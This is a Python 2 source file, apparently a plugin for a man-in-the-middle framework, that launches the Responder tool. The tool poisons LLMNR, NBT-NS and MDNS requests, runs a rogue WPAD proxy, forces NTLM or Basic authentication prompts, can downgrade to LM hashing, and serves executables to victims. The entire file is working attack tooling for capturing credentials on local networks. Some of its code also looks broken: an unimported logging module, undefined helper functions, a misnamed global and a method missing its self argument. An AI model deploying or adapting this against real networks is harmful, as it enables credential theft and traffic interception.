#!/usr/bin/env python2.7

# Copyright (c) 2014-2016 Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import sys
import os
import threading

from plugins.plugin import Plugin
import libs.responder.Responder as Responder
from core.sslstrip.DnsCache import DnsCache
from twisted.internet import reactor

class Responder(Plugin):
    name     = "Responder"
    optname  = "responder"
    desc     = "Poison LLMNR, NBT-NS and MDNS requests"
    version  = "0.2"
    has_opts = True
    req_root = True

    def initialize(self, options):
        '''Called if plugin is enabled, passed the options namespace'''
        self.options = options
        self.interface = options.interface

        RESP_VERSION = "2.1.2"

        try:
            config = options.configfile['Responder']
        except Exception, e:
            sys.exit('[-] Error parsing config for Responder: ' + str(e))

        DnsCache.getInstance().setCustomAddress(options.ip_address)

        for name in ['wpad', 'ISAProxySrv', 'RespProxySrv']:
            DnsCache.getInstance().setCustomRes(name, options.ip_address)

        print "|  |_ NBT-NS, LLMNR & MDNS Responder v%s by Laurent Gaffie online" % RESP_VERSION

        if options.Analyse:
            print '|  |_ Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned'

        Responder.main = self.start_responder

        self.start_responder(options, options.ip_address, config)

    def plugin_reactor(self, strippingFactory):
        reactor.listenTCP(3141, strippingFactory)

    def add_options(self, options):
        options.add_argument('--analyze', dest="Analyse", action="store_true", help="Allows you to see NBT-NS, BROWSER, LLMNR requests from which workstation to which workstation without poisoning")
        options.add_argument('--basic', dest="Basic", default=False, action="store_true", help="Set this if you want to return a Basic HTTP authentication. If not set, an NTLM authentication will be returned")
        options.add_argument('--wredir', dest="Wredirect", default=False, action="store_true", help="Set this to enable answers for netbios wredir suffix queries. Answering to wredir will likely break stuff on the network (like classics 'nbns spoofer' would). Default value is therefore set to False")
        options.add_argument('--nbtns', dest="NBTNSDomain", default=False, action="store_true", help="Set this to enable answers for netbios domain suffix queries. Answering to domain suffixes will likely break stuff on the network (like a classic 'nbns spoofer' would). Default value is therefore set to False")
        options.add_argument('--fingerprint', dest="Finger", default=False, action="store_true", help = "This option allows you to fingerprint a host that issued an NBT-NS or LLMNR query")
        options.add_argument('--wpad', dest="WPAD_On_Off", default=False, action="store_true", help = "Set this to start the WPAD rogue proxy server. Default value is False")
        options.add_argument('--forcewpadauth', dest="Force_WPAD_Auth", default=False, action="store_true", help = "Set this if you want to force NTLM/Basic authentication on wpad.dat file retrieval. This might cause a login prompt in some specific cases. Therefore, default value is False")
        options.add_argument('--lm', dest="LM_On_Off", default=False, action="store_true", help="Set this if you want to force LM hashing downgrade for Windows XP/2003 and earlier. Default value is False")
        options.add_argument('--verbose', dest="Verbose", default=False, action="store_true", help="More verbose")



    def start_responder(options, ip_address, config):

        global VERSION; VERSION = '2.1.2'

        # Set some vars.
        global On_Off; On_Off = config['HTTP'].upper()
        global SSL_On_Off; SSL_On_Off = config['HTTPS'].upper()
        global SMB_On_Off; SMB_On_Off = config['SMB'].upper()
        global SQL_On_Off; SQL_On_Off = config['SQL'].upper()
        global FTP_On_Off; FTP_On_Off = config['FTP'].upper()
        global POP_On_Off; POP_On_Off = config['POP'].upper()
        global IMAP_On_Off; IMAP_On_Off = config['IMAP'].upper()
        global SMTP_On_Off; SMTP_On_Off = config['SMTP'].upper()
        global LDAP_On_Off; LDAP_On_Off = config['LDAP'].upper()
        global DNS_On_Off; DNS_On_Off = config['DNS'].upper()
        global Krb_On_Off; Krb_On_Off = config['Kerberos'].upper()
        global NumChal; NumChal = config['Challenge']
        global SessionLog; SessionLog = config['SessionLog']
        global Exe_On_Off; Exe_On_Off = config['HTTP Server']['Serve-Exe'].upper()
        global Exec_Mode_On_Off; Exec_Mode_On_Off = config['HTTP Server']['Serve-Always'].upper()
        global FILENAME; FILENAME = config['HTTP Server']['Filename']
        global WPAD_Script; WPAD_Script = config['HTTP Server']['WPADScript']
        #HTMLToServe = config.get('HTTP Server', 'HTMLToServe')

        global SSLcert; SSLcert = config['HTTPS Server']['cert']
        global SSLkey; SSLkey = config['HTTPS Server']['key']

        global RespondTo; RespondTo = config['RespondTo'].strip()
        RespondTo.split(",")
        global RespondToName; RespondToName = config['RespondToName'].strip()
        RespondToName.split(",")
        global DontRespondTo; DontRespondTo = config['DontRespondTo'].strip()
        DontRespondTo.split(",")
        global DontRespondToName; DontRespondToName = config['DontRespondToName'].strip()
        DontRespondToName.split(",")

        HTMLToServe = ''

        if len(NumChal) is not 16:
            sys.exit("[-] The challenge must be exactly 16 chars long.\nExample: -c 1122334455667788\n")

        # Break out challenge for the hexidecimally challenged.  Also, avoid 2 different challenges by accident.
        global Challange; Challenge = ""
        for i in range(0,len(NumChal),2):
            Challenge += NumChal[i:i+2].decode("hex")

        #Cli options.
        global OURIP; OURIP = ip_address
        global LM_On_Off; LM_On_Off = options.LM_On_Off
        global WPAD_On_Off; WPAD_On_Off = options.WPAD_On_Off
        global Wredirect; Wredirect = options.Wredirect
        global NBTNSDomain; NBTNSDomain = options.NBTNSDomain
        global Basic; Basic = options.Basic
        global Finger_On_Off; Finger_On_Off = options.Finger
        global INTERFACE; INTERFACE = "Not set"
        global Verbose; Verbose = options.Verbose
        global Force_WPAD_Auth; Force_WPAD_Auth = options.Force_WPAD_Auth
        global AnalyzeMode; AnalyzeMode = options.Analyse

        global ResponderPATH; ResponderPATH = "./logs/"
        global BIND_TO_Interface; BIND_TO_Interface = "ALL"

        AnalyzeICMPRedirect()

        start_message = "Responder will redirect requests to: %s\n" % ip_address
        start_message += "Challenge set: %s\n" % NumChal
        start_message += "WPAD Proxy Server: %s\n" % WPAD_On_Off
        start_message += "WPAD script loaded: %s\n" % WPAD_Script
        start_message += "HTTP Server: %s\n" % On_Off
        start_message += "HTTPS Server: %s\n" % SSL_On_Off
        start_message += "SMB Server: %s\n" % SMB_On_Off
        start_message += "SMB LM support: %s\n" % LM_On_Off
        start_message += "Kerberos Server: %s\n" % Krb_On_Off
        start_message += "SQL Server: %s\n" % SQL_On_Off
        start_message += "FTP Server: %s\n" % FTP_On_Off
        start_message += "IMAP Server: %s\n" % IMAP_On_Off
        start_message += "POP3 Server: %s\n" % POP_On_Off
        start_message += "SMTP Server: %s\n" % SMTP_On_Off
        start_message += "DNS Server: %s\n" % DNS_On_Off
        start_message += "LDAP Server: %s\n" % LDAP_On_Off
        start_message += "FingerPrint hosts: %s\n" % Finger_On_Off
        start_message += "Serving Executable via HTTP&WPAD: %s\n" % Exe_On_Off
        start_message += "Always Serving a Specific File via HTTP&WPAD: %s\n" % Exec_Mode_On_Off
        
        logging.debug(start_message)

        try:
            num_thrd = 1
            Is_FTP_On(FTP_On_Off)
            Is_HTTP_On(On_Off)
            Is_HTTPS_On(SSL_On_Off)
            Is_WPAD_On(WPAD_On_Off)
            Is_Kerberos_On(Krb_On_Off)
            Is_SMB_On(SMB_On_Off)
            Is_SQL_On(SQL_On_Off)
            Is_LDAP_On(LDAP_On_Off)
            Is_DNS_On(DNS_On_Off)
            Is_POP_On(POP_On_Off)
            Is_SMTP_On(SMTP_On_Off)
            Is_IMAP_On(IMAP_On_Off)
            #Browser listener loaded by default
            t1 = threading.Thread(name="Browser", target=serve_thread_udp, args=('', 138, Browser))
            ## Poisoner loaded by default, it's the purpose of this tool...
            t2 = threading.Thread(name="MDNS", target=serve_thread_udp_MDNS, args=('', 5353, MDNS)) #MDNS
            t3 = threading.Thread(name="KerbUDP", target=serve_thread_udp, args=('', 88, KerbUDP)) 
            t4 = threading.Thread(name="NBNS", target=serve_thread_udp, args=('', 137,NB)) #NBNS
            t5 = threading.Thread(name="LLMNR", target=serve_thread_udp_LLMNR, args=('', 5355, LLMNR)) #LLMNR

            for t in [t1, t2, t3, t4, t5]:
                t.setDaemon(True)
                t.start()

        except KeyboardInterrupt:
            exit()
